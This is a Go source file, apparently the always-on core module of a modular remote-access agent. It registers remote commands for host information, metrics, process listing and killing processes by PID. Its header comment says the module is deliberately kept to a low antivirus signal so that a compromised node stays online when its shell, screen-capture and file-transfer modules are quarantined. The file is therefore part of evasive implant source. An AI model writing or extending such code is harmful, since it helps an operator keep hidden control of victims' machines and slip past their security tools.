//go:build !modular || mod_core

package main

import (
	"context"
	"encoding/json"
	"strings"

	"github.com/fakecrowd/sys0/internal/rpc"
	"github.com/fakecrowd/sys0/internal/wire"
	"github.com/shirou/gopsutil/v4/process"
)

// CORE MODULE — benign host telemetry + process listing + lifecycle. This is the
// always-on module: it has the lowest AV signal (no shell exec, no screen
// capture, no file transfer), so a node stays online and reports metrics even
// when higher-signal modules are quarantined.

func init() {
	registerMethod(wire.MethodHostInfo, func(a *Agent, _ context.Context, _ json.RawMessage) (any, *rpc.Error) {
		return hostInfo(), nil
	})
	registerMethod(wire.MethodHostMetrics, func(a *Agent, _ context.Context, _ json.RawMessage) (any, *rpc.Error) {
		return sampleMetrics(), nil
	})
	registerMethod(wire.MethodHostWatch, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
		return a.doHostWatch(params)
	})
	registerMethod(wire.MethodProcList, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
		var p wire.ProcListParams
		decode(params, &p)
		return wire.ProcListResult{Procs: procList(p.Filter)}, nil
	})
	registerMethod(wire.MethodProcSignal, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
		return a.doProcSignal(params)
	})
}

func (a *Agent) doProcSignal(params json.RawMessage) (any, *rpc.Error) {
	var p wire.ProcSignalParams
	if e := decode(params, &p); e != nil {
		return nil, e
	}
	proc, err := process.NewProcess(int32(p.PID))
	if err != nil {
		return nil, rpc.Errorf(rpc.CodeBadParams, "no such process %d", p.PID)
	}
	switch strings.ToUpper(p.Sig) {
	case "KILL":
		err = proc.Kill()
	default: // TERM/INT/HUP -> graceful terminate (cross-platform)
		err = proc.Terminate()
	}
	if err != nil {
		return nil, rpc.Errorf(rpc.CodeInternal, "%v", err)
	}
	return wire.OKResult{OK: true}, nil
}
